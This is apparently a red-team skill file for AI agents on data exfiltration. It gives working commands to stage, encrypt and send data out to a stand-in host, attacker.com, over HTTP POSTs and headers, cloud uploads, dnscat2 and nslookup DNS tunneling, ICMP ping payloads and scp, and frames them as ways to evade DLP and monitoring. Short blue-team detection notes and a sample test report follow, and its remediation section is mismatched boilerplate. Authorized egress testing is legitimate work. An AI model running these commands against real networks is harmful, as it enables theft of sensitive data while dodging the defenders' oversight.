---
name: data-exfiltration-techniques
description: >
  Test organizational egress controls by executing various data exfiltration techniques during a red
  team engagement. Use this skill to simulate an adversary attempting to steal sensitive data without
  triggering DLP (Data Loss Prevention) or network monitoring alerts. Covers exfiltration over DNS,
  ICMP, HTTP/S, alternative protocols (SSH/FTP), cloud services, and physical methods.
domain: cybersecurity
subdomain: red-teaming
category: Post-Exploitation
difficulty: advanced
estimated_time: "3-6 hours"
mitre_attack:
  tactics: [TA0010]
  techniques: [T1048, T1041, T1567, T1052]
platforms: [linux, windows, macos]
tags: [data-exfiltration, dlp-bypass, egress-testing, red-team, post-exploitation, dns-tunneling]
tools: [dnschef, iodine, dnscat2, curl, powershell]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Data Exfiltration Techniques

## When to Use
- During the final phases of a red team operation to achieve the objective
- When testing the effectiveness of Data Loss Prevention (DLP) solutions
- When validating egress firewall rules and network segmentation
- To prove impact after accessing simulated sensitive data (crown jewels)
- When establishing covert outbound communication channels


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Data Preparation & Obfuscation

```bash
# Before sending, data must be staged, compressed, and encrypted to evade DLP

# Linux: Archive, Encrypt, and Encode
tar -czvf data.tar.gz /path/to/sensitive/data
openssl enc -aes-256-cbc -salt -in data.tar.gz -out data.enc -k "SecretPassword"
base64 data.enc > data.b64

# Windows: Compress and Encrypt (PowerShell)
Compress-Archive -Path C:\SensitiveData\* -DestinationPath C:\Temp\data.zip
# AES encryption script or simply converting to Base64 to bypass basic filters
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\data.zip")) | Out-File C:\Temp\data.b64

# Split large files into chunks
split -b 10M data.b64 chunk_
```

### Phase 2: Exfiltration over Standard Web Protocols (HTTP/HTTPS)

```bash
# Web protocols are often allowed outbound

# 1. HTTP POST to attacker server
curl -X POST -d @data.b64 http://attacker.com/upload

# 2. Exfiltration via HTTP Headers (stealthier)
# Break data into chunks and send via User-Agent or custom header
for chunk in $(cat data.b64 | fold -w 50); do
  curl -H "X-Session-ID: $chunk" https://attacker.com/api/v1/status
done

# 3. Exfiltration to legitimate Cloud Services (often bypasses proxies/allowlists)
# - AWS S3
aws s3 cp data.enc s3://attacker-controlled-bucket/
# - Pastebin
curl -X POST -d "api_dev_key=YOUR_KEY" -d "api_option=paste" -d "api_paste_code=$(cat data.b64)" https://pastebin.com/api/api_post.php
# - GitHub Gist, Transfer.sh, File.io, Discord Webhooks
```

### Phase 3: Exfiltration over DNS (DNS Tunneling)

```bash
# DNS is rarely blocked outbound and often ignores proxy settings

# Concept: Embed data in DNS query subdomains:
# <data_chunk>.attacker.com

# Attacker Server Setup (dnscat2 server):
ruby dnscat2.rb attacker.com

# Victim Client Execution (dnscat2 client):
./dnscat --dns domain=attacker.com

# Manual DNS Exfiltration via Hex/Base32 encoding:
# Convert data to hex, split into 60-char chunks
xxd -p data.txt | fold -w 60 | while read chunk; do
  nslookup "$chunk.data.attacker.com"
done

# Attacker server captures DNS queries using tcpdump or custom DNS script:
# tshark -i eth0 -f "udp port 53" -Y "dns.qry.name contains data.attacker.com"
```

### Phase 4: Exfiltration over ICMP

```bash
# Embedding data in ping payloads

# Linux Client (sending hex data in ping requests)
cat data.txt | xxd -p | fold -w 32 | while read chunk; do
  ping -c 1 -p "$chunk" attacker.com
done

# Attacker Server (receiving via tcpdump)
sudo tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo -X
```

### Phase 5: Alternative & Covert Protocols

```bash
# 1. Exfiltration via SSH / SCP
scp data.enc user@attacker.com:/tmp/

# 2. NTP (Network Time Protocol) Exfiltration
# Embed data in NTP requests if port 123 UDP is open

# 3. Exfiltration via Email (SMTP)
# Attach encrypted file and send via company Outlook or SMTP server
# Alternatively, encode data into email subjects or draft folders (Outlook Web Access API)

# 4. RDP Clipboard / Drive Redirection
# If connected via RDP, simply copy-paste data, or map local drives to the RDP session (\tsclient\c)
```

## 🔵 Blue Team Detection
- **Egress filtering**: Default-deny outbound policy; only allow required ports/protocols through proxies.
- **DNS monitoring**: Alert on unusually large numbers of DNS queries, especially TXT/NULL records, or excessively long/random subdomains.
- **DLP Solutions**: Inspect outbound HTTP/S traffic, emails, and cloud storage uploads for sensitive data patterns (SSNs, credit cards, source code).
- **Traffic anomaly detection**: Alert on sudden spikes in outbound bandwidth to unknown or low-reputation IP addresses.
- **Proxy Logs**: Monitor for unusual User-Agents, large POST requests, or connections to unapproved cloud storage providers.

## Key Concepts
| Concept | Description |
|---------|-------------|
| DLP | Data Loss Prevention, tools designed to stop sensitive data from leaving the network |
| DNS Tunneling | Bypassing firewalls by encapsulating data within DNS queries and responses |
| Steganography | Hiding data within seemingly innocent files (e.g., embedding data in an image) |
| C2 Server | Command and Control server used to receive exfiltrated data |
| Out-of-Band (OOB) | Sending data over a different channel than the primary communication channel |

## Output Format
```
Data Exfiltration Testing Report
================================
Target Environment: Corporate Network (VLAN 40)
Simulated Data: 50MB dummy PII file (Credit Card numbers)

Test Results:
1. HTTP POST to unknown IP: BLOCKED by Corporate Proxy
2. Upload to unauthorized AWS S3: BLOCKED by Cloud Access Security Broker (CASB)
3. DNS Exfiltration (Hex encoded): SUCCESS - No alerts triggered. Rate: 10 KB/s
4. ICMP Payload Exfiltration: SUCCESS - Firewall allows outbound ping. Rate: 1 KB/s

Conclusion:
The network successfully stops traditional web-based exfiltration, but fails to monitor or block Covert Channels (DNS/ICMP). 

Recommendations:
- Implement DNS query length monitoring and strict DNS resolution policies.
- Disable outbound ICMP echo requests from internal workstations.
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- MITRE ATT&CK: [TA0010 - Exfiltration](https://attack.mitre.org/tactics/TA0010/)
- dnscat2: [GitHub](https://github.com/iagox86/dnscat2)
- Egress Assessment Frameworks: [Egress-Assess](https://github.com/ChrisTruncer/Egress-Assess)
